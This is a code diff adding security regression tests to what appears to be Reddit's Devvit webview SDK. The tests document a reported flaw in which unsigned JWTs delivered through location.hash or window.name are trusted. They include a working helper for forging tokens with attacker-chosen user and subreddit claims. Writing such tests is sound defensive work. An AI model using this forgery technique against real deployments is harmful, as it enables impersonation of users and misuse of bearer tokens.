@@ -675,3 +675,146 @@ describe('updateConsentStatus()', () => {
     expect(globalThis.devvit.appPermissionState).toBeUndefined();
   });
 });
+
+/**
+ * Regression coverage for HackerOne #3686916:
+ *   "Reddit devvit Web-View: Unauthenticated BridgeContext Injection via
+ *    `location.hash` + `jwtDecode` Without Signature Verification"
+ *
+ * `initDevvitGlobal` reads the BridgeContext directly from `location.hash`
+ * (or `window.name`) with no integrity check, then feeds
+ * `bridge.signedRequestContext` through `jwt-decode`, which is a
+ * *decode-only* library that never verifies the JWT signature.
+ *
+ * As a result, any party that can influence the webview URL fragment can
+ * supply a forged JWT whose claims are promoted verbatim into
+ * `globalThis.devvit.context` and exposed to the embedded app as `devvit.token`.
+ *
+ * These tests document the current, insecure behavior: they PASS today and
+ * MUST FAIL once the webview SDK verifies the JWT signature (or stops
+ * trusting hash-provided claims).
+ */
+describe('SECURITY: unauthenticated BridgeContext via location.hash (H1-3686916)', () => {
+  afterEach(() => {
+    delete (globalThis as { devvit?: DevvitGlobal }).devvit;
+  });
+
+  /** Build an RFC 7519-shaped JWT with an arbitrary, unverified signature. */
+  function forgeJwt(devvitClaim: Readonly<RequestContext>): string {
+    const b64url = (obj: unknown): string =>
+      Buffer.from(JSON.stringify(obj), 'utf8')
+        .toString('base64')
+        .replace(/=+$/, '')
+        .replace(/\+/g, '-')
+        .replace(/\//g, '_');
+    const header = b64url({ alg: 'HS256', typ: 'JWT' });
+    const payload = b64url({ iss: 'attacker', devvit: devvitClaim });
+    // Attacker-chosen signature bytes; jwt-decode never checks these.
+    const signature = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
+    return `${header}.${payload}.${signature}`;
+  }
+
+  test('forged JWT in location.hash is accepted and populates devvit.context', () => {
+    const forgedClaims: RequestContext = {
+      app: {
+        id: 'attacker-app',
+        name: 'victim-app',
+        version: '9.9.9',
+        status: 1,
+        slug: 'victim-app',
+      },
+      subreddit: { id: 't5_victim', name: 'victimSub' },
+      user: {
+        id: 't2_attacker',
+        name: 'attacker',
+        snoovatar: 'https://evil.example/avatar.png',
+        sessionId: '',
+        devvitLoid: 'attacker-loid',
+      },
+      post: { id: 't3_victim', author: 't2_otherVictim' },
+    };
+    const forgedJwt = forgeJwt(forgedClaims);
+
+    const bridge: BridgeContext = {
+      devvitDebug: '',
+      client: Client.SHREDDIT,
+      signedRequestContext: forgedJwt,
+      webbitToken: noWebbitToken,
+    };
+    const hash = `#${encodeURIComponent(JSON.stringify(bridge))}`;
+
+    initDevvitGlobal({ currentScript: null }, { hash }, { name: '' });
+
+    // The hash-delivered JWT is trusted verbatim: attacker controls identity.
+    expect(devvit.context.userId).toBe('t2_attacker');
+    expect(devvit.context.username).toBe('attacker');
+    expect(devvit.context.loid).toBe('attacker-loid');
+    expect(devvit.context.snoovatar).toBe('https://evil.example/avatar.png');
+    expect(devvit.context.subredditId).toBe('t5_victim');
+    expect(devvit.context.subredditName).toBe('victimSub');
+    expect(devvit.context.postAuthorId).toBe('t2_otherVictim');
+
+    // The forged JWT is exposed to the embedded app as its bearer token,
+    // ready to be sent to Reddit backends on subsequent API calls.
+    expect(devvit.token).toBe(forgedJwt);
+  });
+
+  test('forged BridgeContext in window.name is also trusted (same sink)', () => {
+    const forgedJwt = forgeJwt({
+      app: {
+        id: 'attacker-app',
+        name: 'victim-app',
+        version: '1.0.0',
+        status: 1,
+        slug: 'victim-app',
+      },
+      subreddit: { id: 't5_v', name: 'victimSub' },
+      user: {
+        id: 't2_spoof',
+        name: 'spoofedUser',
+        snoovatar: '',
+        sessionId: '',
+        devvitLoid: '',
+      },
+      post: { id: 't3_v', author: 't2_v' },
+    });
+    const bridge: BridgeContext = {
+      devvitDebug: '',
+      client: Client.SHREDDIT,
+      signedRequestContext: forgedJwt,
+      webbitToken: noWebbitToken,
+    };
+
+    initDevvitGlobal({ currentScript: null }, { hash: '' }, { name: JSON.stringify(bridge) });
+
+    expect(devvit.context.userId).toBe('t2_spoof');
+    expect(devvit.context.username).toBe('spoofedUser');
+    expect(devvit.token).toBe(forgedJwt);
+  });
+
+  test('a corrupted signature on an otherwise valid JWT is still accepted (no verification)', () => {
+    // Take the header + payload of a legitimate-looking JWT, then replace the
+    // signature with attacker-chosen bytes. `jwt-decode` never checks, so the
+    // claims round-trip successfully.
+    const legitHeader =
+      'eyJhbGciOiJIUzI1NiIsImtpZCI6IjRkZjhhM2U1LTcwYmYtNWM5Zi05NzYwLTQyZGQ4ZWVjZmY1NyIsInR5cCI6IkpXVCJ9';
+    const legitPayload =
+      'eyJkZXZ2aXQiOnsiYXBwIjp7ImlkIjoiYXBwMTIzIiwibmFtZSI6ImxlZ2l0LWFwcCIsInZlcnNpb24iOiIxLjAuMCIsInN0YXR1cyI6MSwic2x1ZyI6ImxlZ2l0LWFwcCJ9LCJzdWJyZWRkaXQiOnsiaWQiOiJ0NV8xIiwibmFtZSI6ImxlZ2l0U3ViIn0sInVzZXIiOnsiaWQiOiJ0Ml9yZWFsIiwibmFtZSI6InJlYWxVc2VyIn0sInBvc3QiOnsiaWQiOiJ0M18xIiwiYXV0aG9yIjoidDJfMSJ9fX0';
+    const tampered = `${legitHeader}.${legitPayload}.deadbeefdeadbeefdeadbeefdeadbeefdeadbeef`;
+    const bridge: BridgeContext = {
+      devvitDebug: '',
+      client: Client.SHREDDIT,
+      signedRequestContext: tampered,
+      webbitToken: noWebbitToken,
+    };
+
+    initDevvitGlobal(
+      { currentScript: null },
+      { hash: `#${encodeURIComponent(JSON.stringify(bridge))}` },
+      { name: '' }
+    );
+
+    expect(devvit.context.username).toBe('realUser');
+    expect(devvit.token).toBe(tampered);
+  });
+});
